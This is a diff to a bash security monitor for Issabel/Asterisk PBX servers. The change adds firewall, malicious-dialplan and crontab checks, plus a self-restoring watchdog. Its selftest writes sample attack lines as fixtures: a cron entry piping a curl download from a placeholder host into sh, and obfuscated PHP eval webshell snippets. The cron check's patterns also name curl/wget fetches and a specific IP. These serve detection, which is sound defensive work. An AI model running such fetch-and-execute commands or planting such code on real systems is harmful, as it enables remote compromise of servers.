@@ -3,8 +3,10 @@
 # IPBX SENTINEL - Monitor de integridade web e anti-webshell (PRISMA TELECOM)
 # ==============================================================================
 # Compativel com Issabel 4 (CentOS 7) e Issabel 5 (Rocky Linux 8).
-# Atua SOMENTE na camada web (/var/www/html). Nao toca no Asterisk, no dialplan,
-# nem nos scripts PHP legitimos do painel, APIs, WhatsApp ou webhooks.
+# Monitor UNICO de seguranca (substitui o antigo monitor_prisma.sh). A varredura de
+# arquivos atua so na camada web (/var/www/html); nao toca nos scripts PHP legitimos
+# do painel, APIs, WhatsApp ou webhooks. Os checks de host (firewall, dialplan, cron)
+# apenas leem; so o firewall e reativado se cair. Nunca reinicia o Asterisk.
 #
 # O QUE FAZ
 #  1. Webshells: procura assinaturas conhecidas (caso Emad e eval ofuscado em
@@ -14,12 +16,16 @@
 #  3. PHP em pastas estaticas (images/, img/): nunca deveria existir.
 #  4. Contas e senhas: avisa se surgir usuario novo, senha alterada ou removido no
 #     painel (acl.db), FreePBX (ampusers), MySQL e arquivos /etc/*.conf de credenciais.
-#  5. Para cada achado: move para QUARENTENA (reversivel), avisa no Telegram com
+#  5. Host (a cada minuto, leve): firewall caiu (alerta e reativa), dialplan malicioso
+#     (thanku-outcall) e crontab suspeito de asterisk/root (so alerta).
+#  6. Autoprotecao: watchdog restaura o proprio Sentinel/cron se forem apagados.
+#  7. Para cada achado de arquivo: move para QUARENTENA (reversivel), avisa no Telegram com
 #     data/hora, arquivo e IP de origem (quando aparece no log do Apache).
 #
 # USO
 #   ipbx-sentinel --scan           varredura completa (padrao)
 #   ipbx-sentinel --incremental    so arquivos alterados recentemente (cron)
+#   ipbx-sentinel --host           so checks de host: firewall, dialplan, cron (cron, 1 min)
 #   ipbx-sentinel --install        instala comando, config e cron (/etc/cron.d)
 #   ipbx-sentinel --uninstall      remove o cron
 #   ipbx-sentinel --list           lista itens em quarentena
@@ -31,6 +37,7 @@
 # CONFIGURACAO (opcional) em /etc/ipbx/sentinel.conf (root, modo 600):
 #   SENTINEL_ACTION=quarantine     # quarantine | alert (apenas avisa)
 #   SENTINEL_HEAL_PERMS=0          # 1 = remove escrita de "outros" em arquivos web
+#   SENTINEL_FIREWALL_HEAL=1       # 1 = reativa iptables/firewalld se cair (0 = so avisa)
 # Telegram: /etc/ipbx/telegram.conf  ->  TELEGRAM_BOT_TOKEN=...  TELEGRAM_CHAT_ID=...
 # Excecoes (falsos positivos): /etc/ipbx/sentinel.allow (um caminho/glob por linha)
 # ==============================================================================
@@ -51,6 +58,7 @@ HOSTNAME_S="$(hostname 2>/dev/null || echo pbx)"
 
 SENTINEL_ACTION="${SENTINEL_ACTION:-quarantine}"
 SENTINEL_HEAL_PERMS="${SENTINEL_HEAL_PERMS:-0}"
+SENTINEL_FIREWALL_HEAL="${SENTINEL_FIREWALL_HEAL:-1}"
 [ -r "$CONF_FILE" ] && . "$CONF_FILE" 2>/dev/null
 SEND_ALERTS="${SENTINEL_NO_ALERT:+0}"
 SEND_ALERTS="${SEND_ALERTS:-1}"
@@ -289,9 +297,74 @@ report() {
   send_telegram "$msg"
 }
 
+# ------------------------------------------------------------------------------
+# CHECKS DE HOST (herdados do antigo monitor_prisma.sh). Leves, rodam a cada minuto.
+# ------------------------------------------------------------------------------
+seen_once() {  # $1 = chave; devolve 0 so na primeira vez (evita alerta repetido a cada minuto)
+  mkdir -p "$STATE_DIR" 2>/dev/null; chmod 700 "$STATE_DIR" 2>/dev/null
+  local h; h="$(printf '%s' "$1" | sha256sum | awk '{print $1}')"
+  grep -qxF "$h" "$STATE_DIR/host.seen" 2>/dev/null && return 1
+  echo "$h" >> "$STATE_DIR/host.seen"; chmod 600 "$STATE_DIR/host.seen" 2>/dev/null
+  return 0
+}
+
+check_firewall() {
+  command -v systemctl >/dev/null 2>&1 || return 0
+  local svc="" st rules bad=0 flag="$STATE_DIR/fw.down"
+  mkdir -p "$STATE_DIR" 2>/dev/null
+  if systemctl is-enabled iptables >/dev/null 2>&1 || systemctl is-active iptables >/dev/null 2>&1; then svc=iptables
+  elif systemctl is-enabled firewalld >/dev/null 2>&1 || systemctl is-active firewalld >/dev/null 2>&1; then svc=firewalld; fi
+  [ -n "$svc" ] || return 0
+  st="$(systemctl is-active "$svc" 2>/dev/null)"; [ -n "$st" ] || st=inactive
+  if [ "$st" != "active" ]; then bad=1
+  elif [ "$svc" = "iptables" ]; then
+    rules="$(iptables -L -n 2>/dev/null | wc -l)"; [ "${rules:-0}" -lt 10 ] && bad=1
+  fi
+  if [ "$bad" = "1" ]; then
+    if [ ! -f "$flag" ]; then
+      : > "$flag"
+      log "FIREWALL: ${svc} fora do ar (estado: ${st})."
+      send_telegram "ALERTA: FIREWALL FORA DO AR - ${HOSTNAME_S}"$'\n'"$(date '+%d/%m/%Y %H:%M:%S')"$'\n'"Servico: ${svc} (estado: ${st})"$'\n'"Acao: $([ "$SENTINEL_FIREWALL_HEAL" = "1" ] && echo "reativando o firewall." || echo "apenas alerta.")"
+    fi
+    [ "$SENTINEL_FIREWALL_HEAL" = "1" ] && systemctl restart "$svc" >/dev/null 2>&1
+  elif [ -f "$flag" ]; then
+    rm -f "$flag"; log "FIREWALL: ${svc} restabelecido."
+    send_telegram "Firewall restabelecido - ${HOSTNAME_S} - $(date '+%d/%m/%Y %H:%M:%S')"
+  fi
+}
+
+check_dialplan() {
+  local g="${SENTINEL_DIALPLAN_GLOB:-/etc/asterisk/extensions*.conf}" hit
+  # shellcheck disable=SC2086
+  hit="$(grep -nE 'thanku-outcall|custom-get-extensions' $g 2>/dev/null | head -n 2)"
+  [ -n "$hit" ] || return 0
+  seen_once "dialplan|$hit" || return 0
+  log "DIALPLAN malicioso: $hit"
+  send_telegram "ALERTA: DIALPLAN MALICIOSO - ${HOSTNAME_S}"$'\n'"$(date '+%d/%m/%Y %H:%M:%S')"$'\n'"Rotas piratas (thanku-outcall) encontradas no Asterisk:"$'\n'"${hit}"$'\n\n'"Nada foi alterado. Rode ipbx-security para limpar."
+}
+
+cron_of() {  # $1 = usuario
+  if [ -n "${SENTINEL_CRON_DIR:-}" ]; then cat "$SENTINEL_CRON_DIR/$1" 2>/dev/null; else crontab -l -u "$1" 2>/dev/null; fi
+}
+
+check_cron() {
+  local a r msg=""
+  a="$(cron_of asterisk | grep -v '^#' | grep -E 'php|sh|wget|curl|cache|supportpbx|emad' | head -n 1)"
+  r="$(cron_of root | grep -v '^#' | grep -E 'postroot|212\.83\.160|curl.*http|wget.*http|python.*http' | head -n 1)"
+  [ -n "$a$r" ] || return 0
+  seen_once "cron|$a|$r" || return 0
+  [ -n "$a" ] && msg+=$'\n'"usuario asterisk: ${a}"
+  [ -n "$r" ] && msg+=$'\n'"usuario root: ${r}"
+  log "CRON suspeito:${msg//$'\n'/ | }"
+  send_telegram "ALERTA: CRONTAB SUSPEITO - ${HOSTNAME_S}"$'\n'"$(date '+%d/%m/%Y %H:%M:%S')${msg}"$'\n\n'"Nada foi alterado. Revise com: crontab -l -u asterisk"
+}
+
+host_checks() { check_firewall; check_dialplan; check_cron; }
+
 do_scan() {
   local mode="$1"
   [ -d "$WEB_DIR" ] || { log "Diretorio web $WEB_DIR nao existe."; return 0; }
+  host_checks
   scan_rogue_modules
   scan_static_php
   scan_signatures "$mode"
@@ -303,24 +376,53 @@ do_scan() {
   return 0
 }
 
+migrate_old_monitor() {
+  # Une o antigo monitor_prisma.sh ao Sentinel: preserva credenciais do Telegram
+  # (sem exibi-las), remove cron/arquivos antigos e o watchdog antigo (token fixo).
+  local old_found=0 f
+  for f in /usr/local/bin/monitor_prisma.sh /usr/local/bin/monitor_issabel_users.sh /etc/ipbx/monitor_prisma.sh; do [ -e "$f" ] && old_found=1; done
+  if [ ! -s "$TG_CONF" ]; then
+    load_telegram
+    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
+      ( umask 077; printf 'TELEGRAM_BOT_TOKEN="%s"\nTELEGRAM_CHAT_ID="%s"\n' "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID" > "$TG_CONF" )
+      chmod 600 "$TG_CONF"; echo "Credenciais do Telegram copiadas para $TG_CONF (modo 600). Troque o token no BotFather e edite esse arquivo."
+    elif [ "$old_found" = "1" ]; then
+      echo "AVISO: monitor antigo sem credenciais legiveis; crie $TG_CONF (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID)."
+    fi
+  fi
+  if crontab -l 2>/dev/null | grep -q 'monitor_issabel_users.sh'; then
+    crontab -l 2>/dev/null | grep -v 'monitor_issabel_users.sh' | crontab - && echo "Cron do monitor antigo removido (o Sentinel assume)."
+  fi
+  rm -f /usr/local/bin/monitor_prisma.sh /usr/local/bin/monitor_issabel_users.sh /etc/ipbx/monitor_prisma.sh
+  return 0
+}
+
 cmd_install() {
   mkdir -p /etc/ipbx "$QUAR_ROOT" /var/backup/ipbx
   chmod 700 "$QUAR_ROOT" 2>/dev/null
   local self; self="$(readlink -f "$0" 2>/dev/null || echo "$0")"
   if [ -f "$self" ] && [ "$self" != "/usr/local/bin/ipbx-sentinel" ]; then /bin/cp -f "$self" /usr/local/bin/ipbx-sentinel; fi
   chmod +x /usr/local/bin/ipbx-sentinel
+  /bin/cp -pf /usr/local/bin/ipbx-sentinel /etc/ipbx/ipbx-sentinel.bak 2>/dev/null   # copia para o watchdog
   if [ ! -f "$CONF_FILE" ]; then
-    printf '# IPbx Sentinel\nSENTINEL_ACTION=quarantine\nSENTINEL_HEAL_PERMS=0\n' > "$CONF_FILE"; chmod 600 "$CONF_FILE"
+    printf '# IPbx Sentinel\nSENTINEL_ACTION=quarantine\nSENTINEL_HEAL_PERMS=0\nSENTINEL_FIREWALL_HEAL=1\n' > "$CONF_FILE"; chmod 600 "$CONF_FILE"
   fi
   [ -f "$ALLOW_FILE" ] || { printf '# Caminhos/globs liberados (um por linha). Ex.: /var/www/html/meu_modulo/*\n' > "$ALLOW_FILE"; chmod 600 "$ALLOW_FILE"; }
   cat > /etc/cron.d/ipbx-sentinel <<'CRON'
-# IPbx Sentinel - monitor anti-webshell (camada web)
+# IPbx Sentinel - monitor unico de seguranca
+* * * * * root /usr/bin/flock -n /var/run/ipbx-sentinel-host.lock /usr/bin/nice -n 19 /usr/local/bin/ipbx-sentinel --host >/dev/null 2>&1
 */5 * * * * root /usr/bin/flock -n /var/run/ipbx-sentinel.lock /usr/bin/nice -n 19 /usr/local/bin/ipbx-sentinel --incremental >/dev/null 2>&1
 30 3 * * * root /usr/bin/flock -n /var/run/ipbx-sentinel.lock /usr/bin/nice -n 19 /usr/local/bin/ipbx-sentinel --scan >/dev/null 2>&1
 CRON
   chmod 644 /etc/cron.d/ipbx-sentinel
-  echo "Sentinel instalado: /usr/local/bin/ipbx-sentinel + /etc/cron.d/ipbx-sentinel (a cada 5 min e varredura completa as 03:30)."
-  echo "Telegram: usa /etc/ipbx/telegram.conf (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID) ou o monitor ja instalado."
+  # Watchdog (sem credenciais): se o Sentinel ou seu cron forem apagados, restaura e avisa
+  cat > /etc/cron.d/ipbx-watchdog <<'WD'
+* * * * * root [ -x /usr/local/bin/ipbx-sentinel ] && [ -f /etc/cron.d/ipbx-sentinel ] || { [ -f /etc/ipbx/ipbx-sentinel.bak ] && /bin/cp -pf /etc/ipbx/ipbx-sentinel.bak /usr/local/bin/ipbx-sentinel && chmod +x /usr/local/bin/ipbx-sentinel && /usr/local/bin/ipbx-sentinel --install >/dev/null 2>&1 && /usr/local/bin/ipbx-sentinel --alert-restored >/dev/null 2>&1; }
+WD
+  chmod 644 /etc/cron.d/ipbx-watchdog
+  migrate_old_monitor
+  echo "Sentinel instalado: /usr/local/bin/ipbx-sentinel + /etc/cron.d/ipbx-sentinel (host a cada 1 min, arquivos a cada 5 min, varredura completa as 03:30)."
+  echo "Telegram: $TG_CONF (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID). Teste: ipbx-sentinel --test-alert"
 }
 
 cmd_list() { if [ -s "$QUAR_ROOT/INDEX.tsv" ]; then awk -F'\t' '{printf "%s | %s | %s\n   -> %s\n", $1, $4, $2, $3}' "$QUAR_ROOT/INDEX.tsv"; else echo "Quarentena vazia."; fi; }
@@ -345,11 +447,18 @@ cmd_selftest() {
   echo '<?php eval($x($y("z"))); ?>'                          > "$T/web/admin/libraries/php-upgrade/compat.php"
   echo '<?php $v = doubleval($a); ?>'                          > "$T/web/admin/modules/core/XML_Unserializer.php"
   echo 'x' > "$T/web/admin/modules/phones/index.php"
-  ( WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" "$0" --scan >/dev/null 2>&1 )
+  mkdir -p "$T/bin" "$T/cron"
+  printf '#!/bin/bash\ncase "$1" in is-enabled) exit 0;; is-active) echo inactive; exit 3;; *) exit 0;; esac\n' > "$T/bin/systemctl"; chmod +x "$T/bin/systemctl"
+  echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
+  echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
+  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" "$0" --scan >/dev/null 2>&1 )
   chk() { if [ "$2" = "gone" ] && [ ! -e "$1" ]; then ok=$((ok+1)); elif [ "$2" = "kept" ] && [ -e "$1" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: $1 deveria estar '$2'"; fi; }
   chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
   chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
   chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
+  for k in "FIREWALL: iptables fora do ar" "DIALPLAN malicioso" "CRON suspeito"; do
+    if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
+  done
   rm -rf "$T"
   echo "Selftest: $ok ok, $bad falha(s)."; [ "$bad" -eq 0 ]
 }
@@ -363,7 +472,9 @@ case "${1:-}" in
   --selftest)    cmd_selftest ;;
   --test-alert)  send_telegram "Teste do IPbx Sentinel em ${HOSTNAME_S} - $(date '+%d/%m/%Y %H:%M:%S'). Se esta mensagem chegou, o alerta esta funcionando." ; echo "Enviado (se o Telegram estiver configurado)." ;;
   --incremental) do_scan inc ;;
+  --host)        host_checks ;;
+  --alert-restored) send_telegram "ALERTA: o IPbx Sentinel (ou seu agendamento) foi APAGADO em ${HOSTNAME_S} e foi restaurado automaticamente - $(date '+%d/%m/%Y %H:%M:%S'). Investigue quem tem acesso root." ;;
   --scan|"")     do_scan full ;;
-  *) echo "Uso: $0 [--scan|--incremental|--install|--uninstall|--list|--restore ARQ|--baseline|--test-alert|--selftest]"; exit 1 ;;
+  *) echo "Uso: $0 [--scan|--incremental|--host|--install|--uninstall|--list|--restore ARQ|--baseline|--test-alert|--selftest]"; exit 1 ;;
 esac
 exit 0
